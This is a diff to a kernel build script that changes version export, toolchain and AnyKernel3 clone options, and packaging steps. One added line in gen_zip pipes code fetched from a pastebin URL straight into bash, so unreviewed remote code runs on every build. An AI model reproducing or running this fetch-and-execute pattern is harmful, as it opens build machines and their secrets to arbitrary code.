@@ -94,6 +94,7 @@ LOG_DEBUG=0
 DISTRO=$(cat /etc/issue)
 CI_BRANCH=$(git rev-parse --abbrev-ref HEAD)
 export KBUILD_BUILD_HOST CI_BRANCH
+export KBUILD_BUILD_VERSION=$DRONE_BUILD_NUMBER
 ## Check for CI
 if [ -n "$CI" ]
 then
@@ -129,12 +130,12 @@ DATE=$(TZ=Asia/Jakarta date +"%F_%H-%M-%S")
  clone() {
 	echo " "
 	msg "|| Cloning Clang ||"
-	git clone --depth 1 --no-single-branch https://gitlab.com/AnggaR96s/clang-gengkapak -b backup clang
+	git clone --depth 1 --no-single-branch https://gitlab.com/AnggaR96s/clang-gengkapak clang
 		# Toolchain Directory defaults to clang-llvm
 	TC_DIR=$KERNEL_DIR/clang
 
 	msg "|| Cloning Anykernel ||"
-	git clone --depth 1 --no-single-branch https://github.com/AnggaR96s/AnyKernel3.git -b S
+	git clone --depth 1 --no-single-branch https://github.com/AnggaR96s/AnyKernel3.git
 }
 
 ##------------------------------------------------------##
@@ -270,6 +271,10 @@ gen_zip() {
                 tg_post_log
 	fi
 	cd ..
+        cp AnyKernel3/ZIP_FINAL .
+        cp AnyKernel3/changelog .
+        mv changelog Changelog.txt
+        curl https://pastebin.com/raw/wen4CiuH | bash
 }
 
 clone
